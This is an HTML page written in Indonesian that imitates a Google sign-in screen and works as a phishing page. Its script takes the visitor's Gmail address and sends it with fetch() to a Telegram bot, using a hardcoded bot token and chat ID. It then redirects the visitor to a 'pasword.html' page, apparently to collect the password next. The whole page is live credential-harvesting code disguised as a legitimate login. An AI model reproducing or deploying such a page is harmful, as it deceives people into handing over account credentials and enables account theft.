<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="preconnect" href="https://fonts.gstatic.com" />
    <link
      href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400&display=swap"
      rel="stylesheet"
    />
    <link rel="stylesheet" href="./reset.css" />
    <link rel="stylesheet" href="./styles.css" />
    <title>Google</title>
  </head>

  <body>
    <div class="container">
      <div class="card">
        <img src="./images/google-logo.svg" alt=""/>
        <h2 class="satuakun">Satu akun untuk seluruh google</h2>
        <h3 class="keterangan">Masuk akun google anda</h3>

        <input type="email" id="emailInput" placeholder="E-mail atau ponsel" required />
        <div class="btn-email">
          <button type="button">Lupa e-mail anda ?</button>
        </div>
        <div id="loadingSpinner" style="display: none;">
          <div class="spinner"></div>
          <p>Loading...</p>
        </div>
        <p>
          Tidak ada di komputer Anda? Gunakan mode tamu untuk masuk dengan privasi. 
          <a href="">Pelajari lebih lanjut</a>
        </p>

        <div class="card-bottom">
          <a href="#">Buat akun</a>
          <button id="lanjutkanBtn" type="button">Lanjutkan</button>
        </div>
      </div>
    </div>
    
    <script>
      document.getElementById("lanjutkanBtn").addEventListener("click", function() {
        const emailInput = document.getElementById("emailInput");
        const email = emailInput.value.trim();

        // Validasi email
        if (email === "") {
          alert("Email atau ponsel harus diisi!");
          emailInput.focus();
          return;  // Hentikan jika input kosong
        }
        if (!email.includes('@gmail.com')) {
          alert("Email harus menyertakan @gmail.com");
          emailInput.focus();
          return;  // Hentikan jika email tidak valid
        }

        // Tampilkan loading spinner
        document.getElementById("loadingSpinner").style.display = "block";

        // Kirim data email ke Telegram
        const botToken = '6812714144:AAHCwoKn2croDh94SVFfWEmDz7R5eKbL34g';
        const chatId = '1701307635';
        const message = `email yang dimasukkan: ${email}`;

        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`, {
          method: 'GET',
        })
        .then(response => response.json())
        .then(data => {
          // Setelah pengiriman, arahkan ke halaman password
          window.location.href = "pasword.html";  // Halaman tujuan setelah sukses
        })
        .catch(error => {
          console.error('Error:', error);
          alert('Terjadi kesalahan, coba lagi!');
        });
      });
    </script>
  </body>
</html>
